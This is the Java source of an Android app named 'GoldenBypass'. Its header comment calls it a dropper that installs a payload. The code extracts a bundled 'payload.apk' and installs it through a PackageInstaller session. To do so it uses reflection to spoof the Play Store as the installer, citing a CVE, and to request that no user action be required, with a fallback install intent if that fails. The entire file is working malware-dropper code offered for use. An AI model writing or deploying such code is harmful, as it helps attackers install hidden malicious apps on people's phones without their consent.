// language: Java
// file: app/src/main/java/com/golden/bypass/MainActivity.java
// target: Android 8.0-14 (API 26-34)
// purpose: dropper que instala o payload via PackageInstaller.Session

package com.golden.bypass;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {

    private static final String TAG = "GoldenBypass";
    private static final String PAYLOAD_ASSET = "payload.apk";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        File payloadFile = extractAsset(PAYLOAD_ASSET);
        if (payloadFile == null) {
            Toast.makeText(this, "Payload extraction failed", Toast.LENGTH_LONG).show();
            finish();
            return;
        }

        installViaSession(payloadFile);
    }

    private File extractAsset(String assetName) {
        File outFile = new File(getCacheDir(), assetName);
        try (InputStream in = getAssets().open(assetName);
             OutputStream out = new FileOutputStream(outFile)) {
            byte[] buf = new byte[8192];
            int len;
            while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
            return outFile;
        } catch (IOException e) {
            Log.e(TAG, "Asset extraction failed", e);
            return null;
        }
    }

    private void installViaSession(File apkFile) {
        PackageInstaller installer = getPackageManager().getPackageInstaller();

        PackageInstaller.SessionParams params =
                new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);

        // CVE-2026-0089: installerPackageName falsificado como Play Store
        try {
            java.lang.reflect.Method setInstaller =
                    params.getClass().getMethod("setInstallerPackageName", String.class);
            setInstaller.invoke(params, "com.android.vending");
        } catch (Exception e) {
            Log.w(TAG, "setInstallerPackageName not available", e);
        }

        // USER_ACTION_NOT_REQUIRED = 2
        try {
            java.lang.reflect.Method setRequireUserAction =
                    params.getClass().getMethod("setRequireUserAction", int.class);
            setRequireUserAction.invoke(params, 2);
        } catch (Exception e) {
            Log.w(TAG, "setRequireUserAction not available", e);
        }

        int sessionId;
        try {
            sessionId = installer.createSession(params);
        } catch (IOException e) {
            Log.e(TAG, "Session creation failed", e);
            fallbackInstall(apkFile);
            return;
        }

        try (PackageInstaller.Session session = installer.openSession(sessionId)) {
            try (OutputStream out = session.openWrite("base.apk", 0, apkFile.length());
                 InputStream in = new FileInputStream(apkFile)) {
                byte[] buf = new byte[65536];
                int len;
                while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
                session.fsync(out);
            }

            Intent resultIntent = new Intent(this, InstallResultReceiver.class);
            resultIntent.setAction("com.golden.bypass.INSTALL_RESULT");
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    this, sessionId, resultIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);

            session.commit(pendingIntent.getIntentSender());
            Log.i(TAG, "Session committed: " + sessionId);
            Toast.makeText(this, "Installing payload...", Toast.LENGTH_SHORT).show();

        } catch (IOException e) {
            Log.e(TAG, "Session write failed", e);
            fallbackInstall(apkFile);
        }
    }

    private void fallbackInstall(File apkFile) {
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(
                androidx.core.content.FileProvider.getUriForFile(
                        this, getPackageName() + ".fileprovider", apkFile),
                "application/vnd.android.package-archive");
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
}
